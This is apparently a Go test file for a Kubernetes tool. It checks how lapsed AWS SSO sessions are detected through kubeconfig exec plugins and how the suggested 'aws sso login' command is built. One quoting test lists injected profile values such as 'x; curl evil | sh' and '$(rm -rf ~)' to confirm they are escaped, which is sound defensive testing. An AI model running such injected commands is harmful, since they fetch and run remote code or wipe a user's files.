package health

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	clientcmdapi "k8s.io/client-go/tools/clientcmd/api"

	"github.com/thonicdev/kubetower/internal/cluster"
)

// The AWS CLI's own words for a lapsed SSO session, as `aws eks get-token`
// prints them when the cached token cannot be refreshed.
const expiredSSO = "Error when retrieving token from sso: Token has expired and refresh failed"

// A kubeconfig whose exec block is not
// one `internal/ekstoken` signs in process - here a wrapper that runs `aws`
// itself - so client-go runs it, throws its stderr away and says only "failed
// with exit code 255". The page must still say SSO, with the command to copy
// and the kubeconfig's own profile in it.
func TestAWrapperFailingLikeAnExpiredSSOSessionIsReportedAsOne(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the plugin is a shell script")
	}
	dir := t.TempDir()
	plugin := filepath.Join(dir, "eks-wrapper")
	script := "#!/bin/sh\necho '" + expiredSSO + "' >&2\nexit 255\n"
	if err := os.WriteFile(plugin, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	kubeconfig := filepath.Join(dir, "config")
	config := `apiVersion: v1
kind: Config
current-context: eks
clusters:
- name: eks
  cluster: {server: "https://127.0.0.1:1"}
contexts:
- name: eks
  context: {cluster: eks, user: eks}
users:
- name: eks
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      command: ` + plugin + `
      args: [eks, get-token, --cluster-name, prod, --output, json]
      env: [{name: AWS_PROFILE, value: prod-devops}]
      interactiveMode: Never
`
	if err := os.WriteFile(kubeconfig, []byte(config), 0o600); err != nil {
		t.Fatal(err)
	}
	clusters, err := cluster.NewManager(kubeconfig)
	if err != nil {
		t.Fatal(err)
	}
	h := New(Options{Clusters: clusters, Kubeconfig: cluster.Kubeconfig{kubeconfig}, TTL: time.Minute})

	row := h.Check(context.Background(), "eks", false)
	if row.State != StateSSO {
		t.Fatalf("state = %q (%s), want %q", row.State, row.Detail, StateSSO)
	}
	if row.Command != "aws sso login --profile prod-devops" {
		t.Errorf("command = %q, want the kubeconfig's own profile", row.Command)
	}
}

func TestOnlyTheSSOWordsOfAPluginMakeItSSO(t *testing.T) {
	provider := &clientcmdapi.ExecConfig{Command: "aws"}
	refused := probeResult{state: StatePlugin, detail: "refused"}
	for said, want := range map[string]string{
		expiredSSO: StateSSO,
		"refresh cached SSO token failed, cached SSO token is expired": StateSSO,
		// A 401 is classify's SSO arm too; a plugin saying it has not said its
		// session lapsed.
		"error: You must be logged in to the server (Unauthorized)":              StatePlugin,
		"An error occurred (AccessDenied) when calling the AssumeRole operation": StatePlugin,
		"": StatePlugin,
	} {
		runPlugin = func(context.Context, *clientcmdapi.ExecConfig) string { return said }
		if got := heard(context.Background(), refused, provider); got.state != want {
			t.Errorf("%q: state = %q, want %q", said, got.state, want)
		}
	}
	t.Cleanup(func() { runPlugin = defaultRunPlugin })

	// A plugin that would ask a person is not run at all.
	ran := false
	runPlugin = func(context.Context, *clientcmdapi.ExecConfig) string { ran = true; return expiredSSO }
	heard(context.Background(), refused, &clientcmdapi.ExecConfig{Command: "aws", InteractiveMode: clientcmdapi.AlwaysExecInteractiveMode})
	if ran {
		t.Error("an interactive plugin was run with nobody to answer it")
	}
}

func TestTheSSOCommandIsOnlyForAWSContexts(t *testing.T) {
	for _, tc := range []struct {
		name     string
		client   *cluster.Client
		provider *clientcmdapi.ExecConfig
		want     string
	}{
		{"signed in process, profile", &cluster.Client{EKS: &cluster.EKSSigning{Profile: "prod"}}, nil, "aws sso login --profile prod"},
		{"signed in process, default", &cluster.Client{EKS: &cluster.EKSSigning{}}, nil, "aws sso login"},
		{"aws.exe, --profile=", nil, &clientcmdapi.ExecConfig{Command: `C:\aws\aws.exe`, Args: []string{"eks", "get-token", "--profile=dev"}}, "aws sso login --profile dev"},
		{"wrapper naming AWS_PROFILE", nil, &clientcmdapi.ExecConfig{Command: "/usr/local/bin/k8s-auth", Env: []clientcmdapi.ExecEnvVar{{Name: "AWS_PROFILE", Value: "ops"}}}, "aws sso login --profile ops"},
		{"kubelogin, OIDC", nil, &clientcmdapi.ExecConfig{Command: "kubelogin", Args: []string{"get-token", "--oidc-issuer-url", "https://id"}}, ""},
		{"static token", &cluster.Client{}, nil, ""},
	} {
		if got := ssoCommand(tc.client, tc.provider); got != tc.want {
			t.Errorf("%s: %q, want %q", tc.name, got, tc.want)
		}
	}
}

// A profile name from a kubeconfig is offered for pasting into a terminal, so
// anything but a plain word arrives as one quoted argument.
func TestTheSSOCommandQuotesAProfileThatIsNotAPlainWord(t *testing.T) {
	for profile, want := range map[string]string{
		"prod-devops":       "aws sso login --profile prod-devops",
		"team/prod.eu@sso":  "aws sso login --profile team/prod.eu@sso",
		"x; curl evil | sh": "aws sso login --profile 'x; curl evil | sh'",
		"it's":              `aws sso login --profile 'it'\''s'`,
		"$(rm -rf ~)":       "aws sso login --profile '$(rm -rf ~)'",
		"-x":                "aws sso login --profile=-x",
	} {
		provider := &clientcmdapi.ExecConfig{Command: "aws", Args: []string{"eks", "get-token", "--profile", profile}}
		if got := ssoCommand(nil, provider); got != want {
			t.Errorf("%q: %q, want %q", profile, got, want)
		}
	}
}

// Re-runs are one at a time: a probe that cannot have the slot before its
// deadline keeps the plugin arm and runs nothing.
func TestAPluginReRunWaitsForTheOneBeforeIt(t *testing.T) {
	t.Cleanup(func() { runPlugin = defaultRunPlugin })
	ran := 0
	runPlugin = func(context.Context, *clientcmdapi.ExecConfig) string { ran++; return expiredSSO }
	rerunSlot <- struct{}{} // another re-run holds it
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
	defer cancel()
	got := heard(ctx, probeResult{state: StatePlugin}, &clientcmdapi.ExecConfig{Command: "aws"})
	<-rerunSlot
	if got.state != StatePlugin || ran != 0 {
		t.Errorf("state = %q, ran %d times: a probe past its deadline waited or ran anyway", got.state, ran)
	}
	if got := heard(context.Background(), probeResult{state: StatePlugin}, &clientcmdapi.ExecConfig{Command: "aws"}); got.state != StateSSO {
		t.Errorf("with the slot free: state = %q, want %q", got.state, StateSSO)
	}
}

// leavesAChild is a plugin that starts a child holding its stderr, writes the
// child's pid to a file, and fails at once - a credential helper that spawned
// a refresher and did not wait for it. It returns the provider and the pid
// file.
func leavesAChild(t *testing.T) (*clientcmdapi.ExecConfig, string) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("the plugin is a shell script, and the child is killed by its process group")
	}
	dir := t.TempDir()
	plugin, pidFile := filepath.Join(dir, "plugin"), filepath.Join(dir, "child.pid")
	script := "#!/bin/sh\nsleep 600 >/dev/null &\necho $! > '" + pidFile + "'\necho '" + expiredSSO + "' >&2\nexit 1\n"
	if err := os.WriteFile(plugin, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	return &clientcmdapi.ExecConfig{Command: plugin}, pidFile
}

// within runs fn and fails the test if it has not returned by limit. Without
// the fix the call blocks for as long as the child lives.
func within(t *testing.T, limit time.Duration, fn func()) {
	t.Helper()
	done := make(chan struct{})
	start := time.Now()
	go func() { defer close(done); fn() }()
	select {
	case <-done:
		t.Logf("returned after %s", time.Since(start).Round(time.Millisecond))
	case <-time.After(limit):
		t.Fatalf("still running after %s: a child holding the plugin's stderr kept the re-run past its deadline", limit)
	}
}

// childGone kills the child if it survived, and reports whether it had.
func childGone(t *testing.T, pidFile string) bool {
	t.Helper()
	raw, err := os.ReadFile(pidFile)
	if err != nil {
		t.Fatalf("the plugin wrote no pid: %v", err)
	}
	pid, err := strconv.Atoi(strings.TrimSpace(string(raw)))
	if err != nil || pid <= 1 {
		t.Fatalf("pid file holds %q", raw)
	}
	process, err := os.FindProcess(pid)
	if err != nil {
		return true
	}
	// A killed child is reaped by whoever inherited it; give that a moment.
	for deadline := time.Now().Add(3 * time.Second); time.Now().Before(deadline); time.Sleep(50 * time.Millisecond) {
		if process.Signal(syscall.Signal(0)) != nil || exited(pid) {
			return true
		}
	}
	_ = process.Kill()
	return false
}

// exited reports a process that has ended and is waiting to be reaped: a
// zombie answers signal 0 like a live one. Inside an image build the orphaned
// child is inherited by the RUN's shell, PID 1 there, which never reaps it, so
// without this the child reads as running forever. Linux only: elsewhere there
// is no /proc, and a host's init reaps.
func exited(pid int) bool {
	stat, err := os.ReadFile("/proc/" + strconv.Itoa(pid) + "/stat")
	if err != nil {
		return false
	}
	state := procState(string(stat))
	return state == 'Z' || state == 'X'
}

// procState is the state field of a /proc/<pid>/stat line, read after the last
// ')' because the command name in brackets may itself hold spaces and ')'. 0
// when the line has no such field.
func procState(stat string) byte {
	end := strings.LastIndexByte(stat, ')')
	if end < 0 {
		return 0
	}
	rest := strings.TrimLeft(stat[end+1:], " ")
	if rest == "" {
		return 0
	}
	return rest[0]
}

func TestProcState(t *testing.T) {
	for line, want := range map[string]byte{
		"12185 (sleep) Z 1 12183 1 0 -1": 'Z',
		"7 (my (odd) name) S 1 7 7 0 -1": 'S',
		"9 (a) b) R 1":                   'R',
		"garbage":                        0,
		"3 (nothing after)":              0,
	} {
		if got := procState(line); got != want {
			t.Errorf("procState(%q) = %q, want %q", line, got, want)
		}
	}
}

// A zombie is gone for childGone: the process itself is a live one, so it is
// not; a child that has exited and nobody reaped yet is.
func TestExitedTellsAZombieFromALiveProcess(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("reads /proc")
	}
	if exited(os.Getpid()) {
		t.Fatal("this test process reads as exited")
	}
	child, err := os.StartProcess("/bin/sh", []string{"sh", "-c", "exit 0"}, &os.ProcAttr{})
	if err != nil {
		t.Fatal(err)
	}
	// Not waited on: once it exits it stays a zombie of this process.
	deadline := time.Now().Add(5 * time.Second)
	for !exited(child.Pid) {
		if time.Now().After(deadline) {
			t.Fatal("a child that exited and was not reaped does not read as exited")
		}
		time.Sleep(20 * time.Millisecond)
	}
	if child.Signal(syscall.Signal(0)) != nil {
		t.Log("signal 0 already fails on it; the zombie case is not exercised on this kernel")
	}
	if _, err := child.Wait(); err != nil {
		t.Fatal(err)
	}
}

// A plugin that leaves a child holding its stderr is still bounded by the
// probe's deadline, and the child does not outlive the re-run.
func TestAPluginsLeftoverChildDoesNotHoldTheReRun(t *testing.T) {
	provider, pidFile := leavesAChild(t)
	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	var said string
	within(t, time.Second+pluginWaitDelay+3*time.Second, func() { said = defaultRunPlugin(ctx, provider) })
	if !childGone(t, pidFile) {
		t.Error("the plugin's child is still running after the re-run returned")
	}
	if !strings.Contains(said, expiredSSO) {
		t.Errorf("said %q, want the plugin's own words", said)
	}
}

// Through heard: the slot every cluster's re-run shares is free again once the
// re-run is past its deadline.
func TestAPluginsLeftoverChildDoesNotKeepTheReRunSlot(t *testing.T) {
	provider, pidFile := leavesAChild(t)
	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	var got probeResult
	within(t, time.Second+pluginWaitDelay+3*time.Second, func() { got = heard(ctx, probeResult{state: StatePlugin}, provider) })
	select {
	case rerunSlot <- struct{}{}:
		<-rerunSlot
	default:
		t.Error("the re-run slot is still held")
	}
	if !childGone(t, pidFile) {
		t.Error("the plugin's child is still running after the re-run returned")
	}
	if got.state != StateSSO {
		t.Errorf("state = %q, want %q", got.state, StateSSO)
	}
}
